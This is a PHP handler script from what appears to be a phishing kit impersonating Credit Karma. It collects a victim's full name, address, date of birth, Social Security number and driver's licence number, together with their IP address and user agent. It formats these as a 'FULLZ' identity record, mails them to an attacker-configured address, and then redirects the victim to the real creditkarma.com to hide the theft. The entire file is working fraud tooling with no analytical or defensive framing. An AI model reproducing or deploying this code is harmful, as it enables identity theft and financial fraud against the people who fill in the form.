<?php
session_start();

include 'settings.php';

if (isset($_POST['submit'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
	$message .= "|👽----------👽| FULLZ |👽--------------👽|\n";
	
	$message .= "First Name     : ".$_POST['fname']."\n";
    $message .= "Last Name      : ".$_POST['lname']."\n";
    $message .= "Street Address : ".$_POST['locaddr1']."\n";
    $message .= "Apartment      : ".$_POST['locapt']."\n";
    $message .= "City           : ".$_POST['loccity']."\n";
    $message .= "State          : ".$_POST['locstate']."\n";
    $message .= "Zip Code       : ".$_POST['loczip']."\n";
    $message .= "Date of Birth  : ".$_POST['months']."";
    $message .= "/".$_POST['days']."";
    $message .= "/".$_POST['years']."\n";
    $message .= "SSN            : ".$_POST['abc1']."";
    $message .= "-".$_POST['abc2']."";
    $message .= "-".$_POST['abc3']."\n";
	$message .= "|👽----------👽| DL INFO |👽--------------👽|\n";
    $message .= "State Issued   : ".$_POST['issstate']."\n";
    $message .= "DLN            : ".$_POST['DLN']."\n";
	$message .= "|👽--------------👽 I N F O | I P 👽------------👽|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|👽-----------👽 Designed By Akira 👽------------👽|\n";
	$send = $Receive_email;
	$subject = "👽FULLZ👽: $ip";
	mail($send, $subject, $message); 
	
	header("Location: https://creditkarma.com");
    exit();
}
else{
    header("Location: ./index.php");
    exit();
}